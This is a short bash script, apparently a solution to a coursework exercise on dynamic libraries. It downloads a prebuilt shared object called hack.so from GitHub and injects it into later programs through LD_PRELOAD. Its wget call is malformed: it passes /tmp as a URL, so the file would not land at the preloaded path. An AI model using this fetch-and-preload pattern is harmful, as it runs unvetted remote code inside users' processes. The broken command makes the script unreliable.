#!/bin/bash
wget -q /tmp https://github.com/zouhairmariouate01/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hack.so
export LD_PRELOAD=/tmp/hack.so
